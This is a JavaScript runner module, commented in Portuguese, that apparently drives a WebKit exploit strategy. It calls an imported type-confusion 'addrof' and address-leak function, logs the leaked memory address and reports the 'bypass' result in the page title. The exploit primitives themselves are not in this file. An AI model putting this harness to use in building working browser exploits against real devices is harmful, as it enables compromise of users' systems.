// js/script3/runAllAdvancedTestsS3.mjs (Atualizado para Estratégia "Uncaged TC Leak")

import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';

// Importa a função principal e a constante de nome do nosso novo script de teste
import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R43 as executeUncagedTCLeak,
    FNAME_MODULE_FINAL_LEAK
} from './testArrayBufferVictimCrash.mjs'; // O nome do arquivo é o mesmo, mas o conteúdo é o da Estratégia 2

async function runUncagedTCStrategy() {
    const FNAME_RUNNER = "runUncagedTCStrategy"; 
    logS3(`==== INICIANDO Estratégia: Type Confusion em Array 'Uncaged' ====`, 'test', FNAME_RUNNER);
    
    // Chama a função principal do seu script de teste atualizado
    const result = await executeUncagedTCLeak();

    if (result && result.success) {
        logS3(`  RUNNER: SUCESSO! A estratégia de TC em Array 'Uncaged' parece ter funcionado.`, "good", FNAME_RUNNER);
        logS3(`  > Endereço Vazado: ${result.leaked_address}`, "vuln", FNAME_RUNNER);
        document.title = `SUCESSO! Addr: ${result.leaked_address}`;
    } else {
        logS3(`  RUNNER: FALHA na estratégia de TC em Array 'Uncaged'.`, "critical", FNAME_RUNNER);
        logS3(`  > Mensagem: ${result?.error || 'Erro desconhecido.'}`, "critical", FNAME_RUNNER);
        document.title = `${FNAME_MODULE_FINAL_LEAK}: Uncaged TC FAIL!`;
    }
    
    logS3(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia de Bypass CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_FINAL_LEAK}_MainOrchestrator`;
    logS3(`==== INICIANDO Script Final (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    
    await runUncagedTCStrategy();
    
    logS3(`\n==== Script Final (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = false;
}
